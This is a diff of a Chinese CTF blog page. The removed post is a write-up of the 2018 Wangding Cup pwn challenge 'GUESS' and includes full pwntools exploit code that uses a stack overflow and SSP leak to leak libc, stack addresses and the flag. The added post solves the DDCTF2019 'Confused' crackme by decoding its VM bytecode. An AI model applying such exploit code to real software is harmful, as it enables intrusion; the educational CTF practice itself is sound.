@@ -15,24 +15,17 @@
 
 
 
-<meta name="description" content="hint: libc基址泄露+flag泄露">
+<meta name="description" content="题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2018网鼎杯pwn-GUESS">
-<meta property="og:url" content="http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/index.html">
+<meta property="og:title" content="DDCTF2019-Confused">
+<meta property="og:url" content="http://yoursite.com/2019/04/15/DDCTF2019-Confused/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="hint: libc基址泄露+flag泄露">
+<meta property="og:description" content="题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1g0r55df11yj30f801qt8x.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r56yrwzaj31200hswjb.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r5k5sxg6j30vm0t4aff.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5ooe7bpj31q00u0jxc.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5hhyg66j30ga01w74i.jpg">
-<meta property="og:updated_time" content="2019-03-04T15:19:04.079Z">
+<meta property="og:updated_time" content="2019-04-15T11:45:34.350Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018网鼎杯pwn-GUESS">
-<meta name="twitter:description" content="hint: libc基址泄露+flag泄露">
-<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg">
+<meta name="twitter:title" content="DDCTF2019-Confused">
+<meta name="twitter:description" content="题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>2018网鼎杯pwn-GUESS | 4eriri&#39;s blog</title>
+<title>DDCTF2019-Confused | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -196,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-2018网鼎杯pwn-GUESS" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-DDCTF2019-Confused" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/04/2018网鼎杯pwn-GUESS/" class="article-date">
-      <time datetime="2019-03-04T14:26:04.000Z" itemprop="datePublished">2019-03-04</time>
+      <a href="/2019/04/15/DDCTF2019-Confused/" class="article-date">
+      <time datetime="2019-04-15T10:48:38.000Z" itemprop="datePublished">2019-04-15</time>
 </a>
 
 
@@ -215,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      2018网鼎杯pwn-GUESS
+      DDCTF2019-Confused
     </h1>
   
 
@@ -232,44 +225,19 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>hint: libc基址泄露+flag泄露</p>
+        <p>题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。</p>
 <a id="more"></a>
-<p>开启了canary保护</p>
-<p>IDA观察一波：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg" alt=""></p>
-<p>发现输入flag的地方有栈溢出，并且运行了一下发现一共可以输入3次，同时因为有fork的操作，所以即使第一次输入触发了canary，之后仍然可以进行第二第三次输入。</p>
-<p>这里利用<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44069&amp;highlight=pwn" target="_blank" rel="noopener">SSP Leak</a>就可以泄漏libc基址和flag了。</p>
-<p>触发canary后，程序会以<code>%s</code>输出<code>__libc_main_argv[0]</code>，可以通过栈溢出覆盖到这个位置的，从而泄漏出想要泄漏的东西。</p>
-<p>使用gdb对程序进行调试，很方便就能得到该位置：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0r55df11yj30f801qt8x.jpg" alt=""></p>
-<p><code>__libc_main_argv[0]=0x7fffffffdde8</code></p>
-<p>在gets函数后下断点，对栈进行观察，找到输入在栈中的位置：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r56yrwzaj31200hswjb.jpg" alt=""></p>
-<p>这里我输入的是随便打的<code>tyuio</code></p>
-<p><code>input=0x7fffffffdcc0</code></p>
-<p>所以需要的填充为：<code>0x7fffffffdde8-0x7fffffffdcc0=296</code></p>
-<p>不知道libc版本的话，三次栈溢出貌似不太够用，所以我先泄漏了两个libc函数地址，手动找到了libc版本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">start_got=elf.got[&quot;__libc_start_main&quot;]</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(puts_add)</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(start_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)start_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(start_add)</span><br></pre></td></tr></table></figure>
-<p>一开始接受地址的时候，recv了8个字节，结果出了问题，从上面的栈图中也可以发现，64位程序内存的地址貌似最多只有6个字节，因此接受6个字节，再加2个<code>\x00</code>就可以了。</p>
-<p>运行得到两个libc函数的地址：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r5k5sxg6j30vm0t4aff.jpg" alt=""></p>
-<p>通过<a href="https://libc.blukat.me/?q=__libc_start_main%3A740%2Cputs%3A690&amp;l=libc6_2.23-0ubuntu10_amd64" target="_blank" rel="noopener">网站在线查询</a>可以得到libc版本（其实也可以用LibcSearcher这个库，但最近重装虚拟机还没弄好）：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5ooe7bpj31q00u0jxc.jpg" alt=""></p>
-<p>得到基址：<code>libc_base=puts_add-0x06f690</code></p>
-<p>为了泄漏flag，还要知道栈的地址。</p>
-<p>libc里有*environ指针指向栈地址，所以可以通过这个指针泄漏栈地址。</p>
-<p>在刚刚的网站可以查到_environ与libc基址之间的偏移。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br></pre></td></tr></table></figure>
-<p>得到了栈地址之后，只要知道flag在栈中的偏移，就可以泄漏flag。</p>
-<p>通过gdb查看栈地址：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5hhyg66j30ga01w74i.jpg" alt=""></p>
-<p>计算flag在栈中偏移：</p>
-<p><code>0x7fffffffddf8-0x7fffffffdc90=360</code></p>
-<p>最终exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)libc_base=puts_add-0x06f690environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(stack_add-360))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)flag=sh.recvuntil(&quot;&#125;&quot;)print flag</span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-vm:~$ python guess.py[+] Starting local process &apos;./GUESS&apos;: pid 22240[*] &apos;/home/parallels/GUESS&apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)[*] Process &apos;./GUESS&apos; stopped with exit code 0 (pid 22240)flag&#123;just4eriri&#125;</span><br></pre></td></tr></table></figure>
-
+<p>IDA打开，定位到checkcode函数，对输入进行约束，前缀为<code>DDCTF{</code>，结尾为<code>}</code>，中间部分长度为18，另外进入check函数。</p>
+<p>经过分析，程序会根据下面的数组对输入进行校验。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">[0xf0,0x10,0x66,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x30,</span><br><span class="line">0xf6,0xc1,</span><br><span class="line">0xf0,0x10,0x63,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x31,</span><br><span class="line">0xf6,0xb6,</span><br><span class="line">0xf0,0x10,0x6a,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x32,</span><br><span class="line">0xf6,0xab,</span><br><span class="line">0xf0,0x10,0x6a,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x33,</span><br><span class="line">0xf6,0xa0,</span><br><span class="line">0xf0,0x10,0x6d,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x34,</span><br><span class="line">0xf6,0x95,</span><br><span class="line">0xf0,0x10,0x57,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x35,</span><br><span class="line">0xf6,0x8a,</span><br><span class="line">0xf0,0x10,0x6d,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x36,</span><br><span class="line">0xf6,0x7f,</span><br><span class="line">0xf0,0x10,0x73,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x37,</span><br><span class="line">0xf6,0x74,</span><br><span class="line">0xf0,0x10,0x45,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x38,</span><br><span class="line">0xf6,0x69,</span><br><span class="line">0xf0,0x10,0x6d,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x39,</span><br><span class="line">0xf6,0x5e,</span><br><span class="line">0xf0,0x10,0x72,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3a,</span><br><span class="line">0xf6,0x53,</span><br><span class="line">0xf0,0x10,0x52,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3b,</span><br><span class="line">0xf6,0x48,</span><br><span class="line">0xf0,0x10,0x66,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3c,</span><br><span class="line">0xf6,0x3d,</span><br><span class="line">0xf0,0x10,0x63,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3d,</span><br><span class="line">0xf6,0x32,</span><br><span class="line">0xf0,0x10,0x44,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3e,</span><br><span class="line">0xf6,0x27,</span><br><span class="line">0xf0,0x10,0x6a,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3f,</span><br><span class="line">0xf6,0x1c,</span><br><span class="line">0xf0,0x10,0x79,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x40,</span><br><span class="line">0xf6,0x11,</span><br><span class="line">0xf0,0x10,0x65,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x41,</span><br><span class="line">0xf6,0x6,</span><br><span class="line">0xf7,0x1,0x0,0x0,0x0,</span><br><span class="line">0xf3,]</span><br></pre></td></tr></table></figure>
+<p><code>0xf0</code>使<code>a=0xf0后面的第二个数</code></p>
+<p><code>0xf8</code>使<code>a</code>凯撒移位2位</p>
+<p><code>0xf2</code>比较输入与<code>a</code>是否相等</p>
+<p><code>0xf6</code>如果相等则向下运行，否则改变程序流程</p>
+<p><code>0xf7</code>使标记<code>success</code>和<code>failed</code>的标志位为<code>success</code></p>
+<p><code>0xf3</code>结束程序</p>
+<p>加密解密不是很复杂，贴上脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s=[0x66,0x63,0x6a,0x6a,0x6d,0x57,0x6d,0x73,0x45,0x6d,0x72,0x52,0x66,0x63,0x44,0x6a,0x79,0x65]</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in s:</span><br><span class="line">    if i&gt;=ord(&apos;a&apos;) and i&lt;=ord(&apos;z&apos;):</span><br><span class="line">        flag+=chr((i-ord(&apos;a&apos;)+2)%26+ord(&apos;a&apos;))</span><br><span class="line">    elif i&gt;=ord(&apos;A&apos;) and i&lt;=ord(&apos;Z&apos;):</span><br><span class="line">        flag+=chr((i-ord(&apos;A&apos;)+2)%26+ord(&apos;A&apos;))</span><br><span class="line">    else:</span><br><span class="line">        flag+=chr(i)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -277,13 +245,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/04/2018网鼎杯pwn-GUESS/">2018网鼎杯pwn-GUESS</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/15/DDCTF2019-Confused/">DDCTF2019-Confused</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-03-04, 22:26:04</p>
-        <p><span>最后更新:</span>2019-03-04, 23:19:04</p>
+        <p><span>发布时间:</span>2019-04-15, 18:48:38</p>
+        <p><span>最后更新:</span>2019-04-15, 19:45:34</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/04/2018网鼎杯pwn-GUESS/" title="2018网鼎杯pwn-GUESS">http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/15/DDCTF2019-Confused/" title="DDCTF2019-Confused">http://yoursite.com/2019/04/15/DDCTF2019-Confused/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/04/15/DDCTF2019-Confused/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -296,15 +264,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/12/32位程序调用64位代码/">
-                    调用64位代码的32位程序逆向
+                <a href="/2019/04/15/从零开始的Ubuntu16-04配置/">
+                    从零开始的Ubuntu16.04配置
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/02/24/安恒杯2019年2月月赛/">
-                    安恒杯2019年2月月赛
+                <a href="/2019/04/15/PinTool安装与简单使用/">
+                    PinTool安装与简单使用
                 </a>
             </div>
         
@@ -352,7 +320,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"2018网鼎杯pwn-GUESS　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"DDCTF2019-Confused　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -371,8 +339,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/';
-            this.page.identifier = '2019/03/04/2018网鼎杯pwn-GUESS/';
+            this.page.url = 'http://yoursite.com/2019/04/15/DDCTF2019-Confused/';
+            this.page.identifier = '2019/04/15/DDCTF2019-Confused/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -394,7 +362,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/12/32位程序调用64位代码/" title="上一篇: 调用64位代码的32位程序逆向">
+            <a href="/2019/04/15/从零开始的Ubuntu16-04配置/" title="上一篇: 从零开始的Ubuntu16.04配置">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -402,7 +370,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/02/24/安恒杯2019年2月月赛/" title="下一篇: 安恒杯2019年2月月赛">
+            <a href="/2019/04/15/PinTool安装与简单使用/" title="下一篇: PinTool安装与简单使用">
                 <i class="fa fa-angle-right"></i>
             </a>
         
